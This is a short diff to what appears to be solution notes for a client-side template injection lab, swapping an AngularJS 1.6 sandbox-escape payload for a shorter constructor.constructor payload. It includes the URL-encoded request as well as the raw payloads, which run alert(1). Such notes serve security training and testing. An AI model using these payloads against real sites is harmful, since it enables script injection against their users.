@@ -11,10 +11,10 @@ Client-side template injection via AngularJS / Vue / jQuery sinks.
 
 ### csti-level2
 
-`/csti/level2/?query=%7B%7Bx=%7B%27y%27:%27%27.constructor.prototype%7D;x[%27y%27].charAt=%5B%5D.join;$eval(%27x=alert(1)%27);%7D%7D`
+`/csti/level2/?query=%7B%7Bconstructor.constructor('alert(1)')()%7D%7D`
 
-- payload: `{{x={'y':''.constructor.prototype};x['y'].charAt=[].join;$eval('x=alert(1)');}}`
-- context: AngularJS 1.6 sandbox escape via prototype chain
+- payload: `{{constructor.constructor('alert(1)')()}}`
+- context: AngularJS 1.6 has no expression sandbox; constructor.constructor reaches Function
 
 ### csti-level3
 
